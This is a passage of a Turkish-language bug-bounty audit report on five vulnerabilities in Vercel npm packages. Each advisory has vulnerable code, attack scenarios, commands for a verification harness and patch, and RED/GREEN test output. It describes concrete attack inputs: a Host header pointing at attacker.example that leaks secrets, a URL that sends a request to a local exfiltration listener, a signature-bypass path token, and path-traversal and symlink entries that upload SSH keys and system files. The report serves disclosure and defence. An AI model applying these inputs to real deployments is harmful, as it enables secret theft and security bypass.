      "ConstructFullUrl_output": "https://my-protected-deployment.vercel.app/\\@127.0.0.1:38343/exfiltrate",
      "whatwg_origin_check_passed": true,
      "attacker_listener_received_request": true,
      "leaked_authorization": "Bearer vcp_live_SECRET_VERCEL_CLI_TOKEN_998877",
      "leaked_protection_bypass": "0123456789abcdef0123456789abcdef"
    },
    "GREEN": {
      "backslash_and_at_segment_rejected": true,
      "returns_normalized_url_href": true,
      "curl_invoked_with_globoff": true,
      "attacker_listener_received_request": false
    }
  }
}
```


---

### III.42 — vercel/flags (`@vercel/flags-core <= 1.10.2 (verified on published npm @vercel/flags-core@1.10.2)`) — Vercel `@vercel/flags-core@1.10.2` Öneksiz `x-datafile-Updated-At` Başlığı İle Watermark Zehirlemesi ve Kalıcı Özellik Bayrağı (Feature Flag) Dondurma DoS (`VERCEL-FLAGS-CORE-06`) (`CWE-400 / CWE-345`, CVSS `6.5 Medium`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `vercel/flags` (`npm / Node.js: @vercel/flags-core`)
* **Etkilenen Sürüm & Bileşenler:** `<= 1.10.2 (verified on published npm @vercel/flags-core@1.10.2)` — `packages/flags-core/src/controller.ts:555-615`, `packages/flags-core/dist/index.js:465-516` (`streamResponse` / `readBundledDefinitions`)
* **Zafiyet Sınıfı & Skor:** `CWE-400 / CWE-345` — **CVSS v3.1: `6.5 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md`](advisories/tr/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Yanıt Gövdesi ve `res.ok` Doğrulanmadan `datafileUpdatedAtWatermark` Değerinin Güncellenmesi (`packages/flags-core/src/controller.ts:555-615`):** `@vercel/flags-core` içindeki `streamResponse()` metodu, `res.ok` (`200 OK`) durumunu ve geçerli bir JSON veri dosyasını doğrulamadan `x-datafile-Updated-At` başlığını okuyup `this.datafileUpdatedAtWatermark` değerini günceller.
2. **Adım 2 — `x-vercel-*` Öneki Olmayan Başlık Yüzeyi:** Başlık `x-vercel-*` önekine sahip olmadığı için hata yanıtları veya ara vekil sunucular üzerinden `x-datafile-Updated-At: 9999999999999` enjekte edilebilir.
3. **Adım 3 — Acil Durum Kill-Switch ve Feature Flag Güncellemelerinin Kalıcı Olarak Kilitlenmesi:** `datafileUpdatedAtWatermark` değeri `9999999999999` olduktan sonra gerçek zaman damgalı tüm bayrak güncellemeleri (`updatedAt <= this.datafileUpdatedAtWatermark`) süreç yeniden başlatılana kadar sessizce çöpe atılır.

```typescript
// File: packages/flags-core/src/controller.ts (lines 555-615)
const res = await fetch(`${this.serviceUrl}/v1/stream`, { headers });
const updatedAtHeader = res.headers.get('x-datafile-Updated-At');
if (updatedAtHeader) {
  const updatedAt = Number(updatedAtHeader);
  if (!Number.isNaN(updatedAt)) {
    // BUG: Updates watermark BEFORE checking res.ok or validating the JSON datafile payload,
    // and accepts arbitrarily far-future timestamps (e.g. 9999999999999)!
    this.datafileUpdatedAtWatermark = Math.max(this.datafileUpdatedAtWatermark, updatedAt);
  }
}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Olay Müdahalesi Sırasında Acil Durum Kill-Switch Bayrağının Devreye Girememesi:** `x-datafile-Updated-At: 9999999999999` içeren tek bir `503` yanıtı `datafileUpdatedAtWatermark` değerini zehirler; operatörler acil durum bayrağını kapatsa bile uygulama eski (`stale-compromised-variant`) değerde takılı kalır.
* **Senaryo B — `redirect: 'manual'` Eksikliği Nedeniyle Yönlendirme Takibi:** `streamResponse()` içindeki `fetch()` çağrısında `redirect: 'manual'` bulunmadığı için `302` yönlendirmeleri otomatik takip edilir.
* **Senaryo C — Uzun Ömürlü Node.js Sunucularında Kalıcı Durum Kayması:** Zehirlenen iş parçacıkları süreç yeniden başlatılana kadar hiçbir bayrak güncellemesini kabul etmez.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect streamResponse and readBundledDefinitions in published @vercel/flags-core@1.10.2
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/flags-core/dist/index.js | sed -n '465,516p'

# 2. Run the Live @vercel/flags-core@1.10.2 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-06-flags-core-controller-stream-hardening.patch
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "VERCEL-FLAGS-CORE-06": {
    "RED": {
      "package_tested": "@vercel/flags-core@1.10.2",
      "initial_flag_value": "stale-compromised-variant",
      "bundled_legitimate_update_timestamp": 1700000100000,
      "poisoned_header_sent_on_503": "9999999999999",
      "flag_value_after_watermark_poisoning": "stale-compromised-variant",
      "legitimate_bundled_update_ignored": true
    },
    "GREEN": {
      "requires_res_ok_and_valid_datafile_before_watermark_update": true,
      "rejects_future_timestamp_skew": true,
      "legitimate_bundled_update_ignored": false
    }
  }
}
```


---

### III.43 — vercel/flags (`flags <= 4.4.0 (verified on published npm flags@4.4.0)`) — Vercel `flags@4.4.0` `deserialize()` Fonksiyonunda `__no_flags__` Sabiti İle Compact JWS İmza Doğrulamasını Atlama (`VERCEL-FLAGS-05`) (`CWE-347`, CVSS `6.5 Medium`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `vercel/flags` (`npm / Node.js: flags`)
* **Etkilenen Sürüm & Bileşenler:** `<= 4.4.0 (verified on published npm flags@4.4.0)` — `packages/flags/src/next/precompute.ts:206-214`, `packages/flags/dist/next/index.js:119-125` (`deserialize`)
* **Zafiyet Sınıfı & Skor:** `CWE-347` — **CVSS v3.1: `6.5 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md`](advisories/tr/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — JWS İmza Doğrulamasından Önce Koşulsuz `__no_flags__` Dönüşü (`packages/flags/src/next/precompute.ts:206-214`):** `serialize()` fonksiyonu yalnızca `flags.length === 0` olduğunda `'__no_flags__'` üretirken, `deserialize(flags, code, secret)` fonksiyonu `flags.length === 0` olup olmadığını kontrol etmeden ve `compactVerify()` imza doğrulamasına hiç girmeden `if (code === '__no_flags__') return {};` döndürür.
2. **Adım 2 — Next.js `[code]` Dinamik Rota Parametresine Doğrudan Erişim:** Next.js App Router'da `app/[code]/checkout/page.tsx` yapısını kullanan uygulamalarda `[code]` parametresi URL yolunun bir parçasıdır. Saldırgan imza anahtarına (`FLAGS_SECRET`) sahip olmadan doğrudan `/__no_flags__/checkout` adresini çağırabilir.
3. **Adım 3 — Edge Middleware Kararının Atlanarak `flag.decide()` Fonksiyonunun Yeniden Çalışması:** `deserialize()` boş nesne `{}` döndürdüğünde `getPrecomputed()` ilgili bayrağı bulamaz ve Edge Middleware'in imzaladığı `false` kararını atlayarak sunucu tarafında `flag.decide()` fonksiyonunu yeniden çalıştırır (`true`).

```typescript
// File: packages/flags/src/next/precompute.ts (lines 206-214)
export async function deserialize(
  flags: ReadonlyArray<Flag<any, any>>,
  code: string,
  secret: string | undefined = process.env.FLAGS_SECRET,
): Promise<Record<string, any>> {
  if (!secret) throw new Error('flags: deserialize was called without a secret');
  // BUG: Returns {} BEFORE JWS signature verification even when flags.length > 0!
  if (code === '__no_flags__') return {};
  // ... JWS compactVerify() only runs below this line
}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Edge Middleware Coğrafi/Güvenlik Kısıtlamasının Atlanması:** Edge Middleware güvenilmeyen bir istemci için `vipCheckoutFlag = false` kararını JWS ile imzalar; ancak istemci URL'deki imzalı segment yerine `__no_flags__` göndererek imza doğrulamasını atlar ve sunucu tarafında `true` değerini alır.
* **Senaryo B — A/B Kampanya ve Fiyat Kohortu Manipülasyonu:** İmzalı JWS kodu yerine `__no_flags__` gönderilerek `FLAGS_SECRET` bilinmeden yeni kohort hesaplaması tetiklenir.
* **Senaryo C — Önbellek Parçalanması ve Asenkron `decide()` Yükü:** `__no_flags__` segmenti her istekte `flag.decide()` çağrısını yeniden çalıştırır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect deserialize in published flags@4.4.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/flags/dist/next/index.js | sed -n '115,155p'

# 2. Run the Live flags@4.4.0 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-05-flags-precompute-no-flags-sentinel-bypass.patch
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "VERCEL-FLAGS-05": {
    "RED": {
      "package_tested": "flags@4.4.0",
      "legitimate_signed_code_prefix": "eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..",
      "legitimate_precomputed_value": false,
      "forged_code_passed": "__no_flags__",
      "deserialize_output_for_no_flags": {},
      "getPrecomputed_value_with_no_flags_sentinel": true,
      "random_tampered_token_rejected": true
    },
    "GREEN": {
      "sentinel_rejected_when_flags_non_empty": true,
      "getPrecomputed_with_no_flags_throws": true
    }
  }
}
```


---

### III.44 — vercel/firewall (`@vercel/firewall <= 1.2.6 (verified on published npm @vercel/firewall@1.2.6 & Go ipc-proxy)`) — Vercel `@vercel/firewall@1.2.6` `checkRateLimit()` Doğrulanmamış `Host` Başlığı / `region` SSRF İle `VF_RATE_LIMIT_SECRET` Sızıntısı ve Fail-Open Hız Sınırı Atlama (`VERCEL-FIREWALL-01`) (`CWE-918 / CWE-200 / CWE-636`, CVSS `7.2 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `vercel/firewall` (`npm / Node.js & Go: @vercel/firewall`)
* **Etkilenen Sürüm & Bileşenler:** `<= 1.2.6 (verified on published npm @vercel/firewall@1.2.6 & Go ipc-proxy)` — `packages/firewall/src/rate-limit.ts:138-183, 211-285`, `cmd/ipc-proxy/client.go:34-41, 79-97`
* **Zafiyet Sınıfı & Skor:** `CWE-918 / CWE-200 / CWE-636` — **CVSS v3.1: `7.2 High`** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md`](advisories/tr/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Doğrulanmamış `Host` Başlığının Giden HTTPS URL'sine Enjekte Edilmesi (`packages/firewall/src/rate-limit.ts:138-167, 224`):** `VERCEL_ENV !== 'production'` olduğunda (staging, preview veya kendi sunucusunda çalışan kurulumlar), `resolveFirewallHost()` gelen isteğin `Host` başlığını alır ve doğrulama yapmadan `https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check` adresine `POST` isteği gönderir.
2. **Adım 2 — `VF_RATE_LIMIT_SECRET` ve `x-vercel-oidc-token` Sırlarının Dış Sunucuya Sızdırılması (`rate-limit.ts:169-183`):** `buildAuthHeaders()` fonksiyonu bu giden isteğe `x-vercel-rate-limit-secret` ve `x-vercel-oidc-token` başlıklarını ekler.
3. **Adım 3 — Evrensel Fail-Open (`rateLimited: false`) Hız Sınırı Atlaması ve Go `ipc-proxy` Ham `%s` Hatası (`rate-limit.ts:242-284`, `cmd/ipc-proxy/client.go:34-41`):** Saldırgan `VERCEL_ENV=production` ortamında bile `Host: victim.com/@invalid` gönderdiğinde giden istek hata alır ve `callRemoteRateLimitAPI()` **fail-open** yaparak `{ rateLimited: false }` döndürür; böylece parola/OTP deneme sınırı tamamen aşılır.

```typescript
// File: packages/firewall/src/rate-limit.ts (lines 138-167, 211-285)
function resolveFirewallHost(options: RateLimitOptions): string | null {
  if (process.env.VERCEL_ENV !== 'production') {
    const host = extractHostFromHeaders(options.headers) ?? extractHostFromRequest(options.request);
    if (host) return host; // BUG: Unvalidated Host header used directly as HTTPS target authority!
  }
  return process.env.VERCEL_URL || null;
}
// In callRemoteRateLimitAPI():
const endpoint = `https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check`;
const response = await fetch(endpoint, { method: 'POST', headers: authHeaders, body: ... });
// BUG: On any error or >=400 status, fails open with { rateLimited: false }!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Staging / Preview / Self-Hosted Ortamlarda `VF_RATE_LIMIT_SECRET` ve OIDC Token Çalınması:** `await checkRateLimit('login-limit', { request })` kullanan bir uygulamaya `Host: attacker.example` gönderildiğinde `x-vercel-rate-limit-secret` ve `x-vercel-oidc-token` doğrudan saldırgana gönderilir.
* **Senaryo B — `rateLimited: false` Fail-Open İle Parola ve OTP Hız Sınırının Atlanması:** Hatalı `Host` başlığı giden isteğin `404`/`400` almasına yol açar ve SDK `{ rateLimited: false }` döndürerek sınırsız denemeye izin verir.
* **Senaryo C — Go `ipc-proxy` Ham `%s` Hatası:** `cmd/ipc-proxy/client.go:38` `fmt.Sprintf` unutulduğu için `https://api-%s.vercel.com/v1/rate-limit` adresine bağlanmaya çalışır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect rate-limit.js in published @vercel/firewall@1.2.6 and cmd/ipc-proxy/client.go
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/firewall/dist/rate-limit.js | sed -n '90,220p'

# 2. Run the Live @vercel/firewall@1.2.6 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-01-firewall-host-region-ssrf-and-ipc-proxy.patch
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "VERCEL-FIREWALL-01": {
    "RED": {
      "package_tested": "@vercel/firewall@1.2.6",
      "attacker_received_request": true,
      "leaked_rate_limit_secret": "rl_secret_LIVE_99887766",
      "leaked_oidc_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.LIVE_OIDC_PAYLOAD",
      "fail_open_result_on_error": {
        "rateLimited": false,
        "error": "not_found"
      }
    },
    "GREEN": {
      "untrusted_host_and_region_rejected": true,
      "attacker_received_request": false,
      "go_ipc_proxy_sprintf_formatted": true
    }
  }
}
```


---

### III.45 — vercel/vercel (`@vercel/client <= 18.10.0 (verified on published npm @vercel/client@18.10.0)`) — Vercel `@vercel/client@18.10.0` Prebuilt `.vc-config.json` `filePathMap` Üzerinden Keyfi Konak Dosyası Okuma ve `.next/required-server-files.json` Yerel `.env` Sır Yüklemesi (`VERCEL-CLIENT-08A`) (`CWE-200 / CWE-706`, CVSS `5.0 Medium`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `vercel/vercel` (`npm / Node.js: @vercel/client`)
* **Etkilenen Sürüm & Bileşenler:** `<= 18.10.0 (verified on published npm @vercel/client@18.10.0)` — `packages/client/src/utils/hashes.ts:115-167`, `packages/client/src/deploy.ts:127-195` (`filesFromFilePathMap`)
* **Zafiyet Sınıfı & Skor:** `CWE-200 / CWE-706` — **CVSS v3.1: `5.0 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md`](advisories/tr/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — `filesFromFilePathMap()` İçinde Sınır Kontrolsüz `path.resolve(cwd, filePath)` (`packages/client/src/utils/hashes.ts:115-167`):** `vercel deploy --prebuilt` çalıştığında `@vercel/client`, `.vercel/output/functions/**/.vc-config.json` içindeki `filePathMap` tablosunu okur ve `path.resolve(cwd, filePath)` ile çözümlenen her dosyayı proje kökü (`cwd`) veya `.vercelignore` kontrolü yapmadan okur.
2. **Adım 2 — `.next/required-server-files.json` Üzerinden Yerel `.env` Sırlarının Sızması:** Standart Next.js derlemelerinde `.vc-config.json` içindeki `filePathMap`, yerel `.env.local` sırlarını barındıran `.next/required-server-files.json` dosyasını otomatik olarak dağıtım paketine dahil eder.
3. **Adım 3 — CI/CD Prebuilt Artifact Zehirlemesi İle Konak Dosyalarının `/v2/files` API'sine Yüklenmesi:** Üretilen `.vercel/output` dizinindeki `filePathMap` içine `../../../../etc/passwd` veya `~/.npmrc` yazıldığında `vercel deploy --prebuilt` bu dosyaları doğrudan Vercel sunucularına yükler.

```typescript
// File: packages/client/src/utils/hashes.ts (lines 115-167)
export async function filesFromFilePathMap(
  filePathMap: Record<string, string>,
  cwd: string
): Promise<Map<string, DeploymentFile>> {
  for (const [funcPath, filePath] of Object.entries(filePathMap)) {
    // BUG: No check that fsPath stays within cwd, and .vercelignore is never applied!
    const fsPath = path.resolve(cwd, filePath);
    const data = await fs.readFile(fsPath);
    // ... packages data for upload to POST /v2/files
  }
}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — `vercel build && vercel deploy --prebuilt` Sırasında `.vercelignore` Aşılarak `.env.local` Sırlarının Yüklenmesi:** `.vercelignore` içinde `.env*` bulunsa bile `filePathMap` üzerinden `.next/required-server-files.json` yüklendiği için yerel sırlar dağıtım paketine girer.
* **Senaryo B — Ayrık CI/CD Hattında (`build` -> `deploy --prebuilt`) Konak Dosyası Sızıntısı:** PR derleme adımında üretilen `.vercel/output` içindeki `filePathMap`, ayrıcalıklı dağıtım adımında `/home/runner/.npmrc` gibi dosyaları Vercel'e yükler.
* **Senaryo C — Paylaşılan Monorepo Derleme Önbelleği Zehirlemesi:** Önbellekten gelen `.vc-config.json` dağıtım sırasında konak dosyalarını sızdırır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect filesFromFilePathMap in published @vercel/client@18.10.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/client/dist/utils/hashes.js | sed -n '85,145p'

# 2. Run the Live @vercel/client@18.10.0 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-08-client-prebuilt-path-and-symlink-confinement.patch
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "VERCEL-CLIENT-08A": {
    "RED": {
      "package_tested": "@vercel/client@18.10.0",
      "outside_host_file_read_via_filePathMap": true,
      "dotnext_required_server_files_env_uploaded": true,
      "uploaded_payload_excerpt": "SUPER_SECRET_HOST_TOKEN=host_secret_value_12345"
    },
    "GREEN": {
      "outside_cwd_filePathMap_rejected": true,
      "outside_host_file_read_via_filePathMap": false
    }
  }
}
```


---

### III.46 — vercel/vercel (`@vercel/client <= 18.10.0 (verified on published npm @vercel/client@18.10.0)`) — Vercel `@vercel/client@18.10.0` Prebuilt `config.bulkRedirectsPath` Sembolik Bağ (Symlink) Kaçışı ve `.vercelignore` Atlaması İle Konak Dosyası Sızıntısı (`VERCEL-CLIENT-08B`) (`CWE-59 / CWE-200`, CVSS `5.0 Medium`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `vercel/vercel` (`npm / Node.js: @vercel/client`)
* **Etkilenen Sürüm & Bileşenler:** `<= 18.10.0 (verified on published npm @vercel/client@18.10.0)` — `packages/client/src/utils/index.ts:116-148`, `packages/client/src/deploy.ts:145-195` (`buildFileTree` / `bulkRedirectsPath`)
* **Zafiyet Sınıfı & Skor:** `CWE-59 / CWE-200` — **CVSS v3.1: `5.0 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md`](advisories/tr/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — `buildFileTree()` İçinde Doğrulanmamış `config.bulkRedirectsPath` ve Symlink Takibi (`packages/client/src/utils/index.ts:116-148`):** `prebuilt: true` modunda `buildFileTree()`, `.vercel/output/config.json` içinden `config.bulkRedirectsPath` değerini okur ve `join(cwd, config.bulkRedirectsPath)` dizinini `fs.stat()` (sembolik bağları takip eder) ile tarar; `fs.realpath()` ile proje kökü sınır kontrolü yapmaz.
2. **Adım 2 — Prebuilt Modunda `.vercelignore` Kurallarının Atlanması:** `bulkRedirectsPath` taranırken `.vercelignore` filtreleri uygulanmadığı için hariç tutulan gizli dosyalar da okunur.
3. **Adım 3 — Konak Dosyalarının `/v2/files` API'sine Yüklenmesi:** Sembolik bağın işaret ettiği proje dışı konak dosyaları SHA-1 ile özetlenerek Vercel dağıtım sunucularına yüklenir.

```typescript
// File: packages/client/src/utils/index.ts (lines 116-148)
if (config?.bulkRedirectsPath) {
  const bulkRedirectsPath = join(cwd, config.bulkRedirectsPath);
  // BUG: No realpath confinement check and .vercelignore is not applied;
  // readdir/stat follows symlinks pointing outside cwd!
  const bulkRedirectFiles = await readdir(bulkRedirectsPath, []);
  fileList.push(...bulkRedirectFiles);
}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — `bulkRedirectsPath` İçindeki Sembolik Bağ İle SSH/Bulut Anahtarlarının Sızdırılması:** `.vercel/output/config.json` içinde tanımlanan `bulkRedirectsPath` dizinine `/home/runner/.ssh/id_rsa` yönlendiren bir sembolik bağ konulduğunda `buildFileTree()` bu bağı takip ederek özel anahtarı dağıtıma yükler.
* **Senaryo B — `config.json` İçinde Üst Dizin Geçişi (`"bulkRedirectsPath": "../../secrets"`):** Üst dizin yolu verilerek proje kökü dışındaki klasörün tamamı taranıp yüklenir.
* **Senaryo C — `.vercelignore` İhlali:** `.vercelignore` ile engellenen yerel sır dosyaları `bulkRedirectsPath` üzerinden dağıtıma dahil edilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect buildFileTree in published @vercel/client@18.10.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/client/dist/utils/index.js | sed -n '90,145p'

# 2. Run the Live @vercel/client@18.10.0 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-08-client-prebuilt-path-and-symlink-confinement.patch
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "VERCEL-CLIENT-08B": {
    "RED": {
      "package_tested": "@vercel/client@18.10.0",
      "bulkRedirectsPath_symlink_followed_outside_cwd": true,
      "outside_symlink_target_packaged_in_fileList": true,
      "uploaded_payload_excerpt": "OUTSIDE_SYMLINK_SECRET=top_secret_symlink_data_999"
    },
    "GREEN": {
      "bulkRedirectsPath_confined_to_cwd_realpath": true,
      "outside_symlink_target_packaged_in_fileList": false
    }
  }
}
```

<!-- VERCEL-ADVISORIES-END -->
